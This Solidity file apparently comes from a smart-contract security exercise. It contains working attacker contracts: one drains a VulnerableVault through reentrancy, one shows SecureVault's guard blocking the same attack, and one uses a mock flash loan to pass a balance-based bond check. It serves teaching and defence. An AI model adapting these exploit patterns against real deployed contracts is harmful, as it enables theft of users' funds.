// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {VulnerableVault} from "./VulnerableVault.sol";
import {SecureVault} from "./SecureVault.sol";

/// @title ReentrancyAttacker — Exploits the withdraw() reentrancy bug
/// @notice Re-enters withdraw() during the ETH callback to drain the vault.
contract ReentrancyAttacker {
    VulnerableVault public vault;
    bytes32 public targetId;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    /// @notice Deposit into the vault, then trigger the reentrant withdrawal.
    function attack(bytes32 id, uint256 _maxAttacks) external payable {
        targetId = id;
        maxAttacks = _maxAttacks;
        attackCount = 0;

        // Step 1: Make a legitimate deposit
        vault.deposit{value: msg.value}(id);

        // Step 2: Trigger withdraw — the vault sends ETH, which triggers receive()
        vault.withdraw(id);
    }

    /// @notice Callback triggered when the vault sends ETH.
    /// Re-enters withdraw() while the escrow is still marked active.
    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            // Re-enter: the vault hasn't updated state yet, so this passes all checks
            vault.withdraw(targetId);
        }
    }

    /// @notice Withdraw stolen funds.
    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/// @title ReentrancyAttackerSecure — Same attack against SecureVault (should fail)
/// @notice The receive() callback attempts re-entry. SecureVault's nonReentrant
/// modifier causes the re-entrant call to revert, which propagates up and
/// causes the entire withdrawal to fail — the attacker can't even receive
/// their own deposit, let alone drain other users' funds.
contract ReentrancyAttackerSecure {
    SecureVault public vault;
    bytes32 public targetId;
    uint256 public attackCount;
    bool public reentryAttempted;

    constructor(address _vault) {
        vault = SecureVault(payable(_vault));
    }

    function attack(bytes32 id) external payable {
        targetId = id;
        attackCount = 0;
        reentryAttempted = false;

        vault.deposit{value: msg.value}(id);
        vault.withdraw(id);
    }

    receive() external payable {
        if (!reentryAttempted) {
            reentryAttempted = true;
            attackCount++;
            // Attempt re-entry — SecureVault's nonReentrant will revert.
            // This revert propagates up through the receive() callback,
            // causing the original withdraw() to also fail.
            vault.withdraw(targetId);
        }
    }
}

// ─── Flash Loan Infrastructure ────────────────────────────────────────────────

/// @title MockLendingPool — Simple flash loan provider for the exercise
/// @notice Lends ETH to a borrower who must repay within the same transaction.
contract MockLendingPool {
    /// @notice Execute a flash loan. The borrower must repay before this returns.
    function flashLoan(address borrower, uint256 amount) external {
        require(address(this).balance >= amount, "Pool underfunded");

        uint256 balanceBefore = address(this).balance;

        // Send ETH to borrower
        (bool sent,) = borrower.call{value: amount}("");
        require(sent, "Loan transfer failed");

        // Borrower does whatever they want... then we check repayment
        IFlashLoanReceiver(borrower).onFlashLoan(amount);

        // Verify full repayment
        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }

    receive() external payable {}
}

interface IFlashLoanReceiver {
    function onFlashLoan(uint256 amount) external;
}

/// @title FlashLoanAttacker — Exploits the balance-based bond check
/// @notice Borrows ETH via flash loan, registers as solver (passes balance check),
///         then repays — ending up as a registered solver with zero real bond.
contract FlashLoanAttacker is IFlashLoanReceiver {
    VulnerableVault public vault;
    MockLendingPool public pool;
    bytes32 public solverId;

    constructor(address _vault, address _pool) {
        vault = VulnerableVault(payable(_vault));
        pool = MockLendingPool(payable(_pool));
    }

    /// @notice Initiate the attack by requesting a flash loan.
    function attack(bytes32 _solverId) external {
        solverId = _solverId;
        // Borrow enough to pass the MIN_BOND check
        pool.flashLoan(address(this), vault.MIN_BOND());
    }

    /// @notice Called by the lending pool after receiving the loan.
    function onFlashLoan(uint256 amount) external override {
        // At this point, this contract holds 1 ETH (the flash loan).
        // The vault checks `msg.sender.balance >= MIN_BOND` which passes.
        vault.registerSolver(solverId);

        // Repay the flash loan
        (bool sent,) = address(pool).call{value: amount}("");
        require(sent, "Repayment failed");
    }

    receive() external payable {}
}
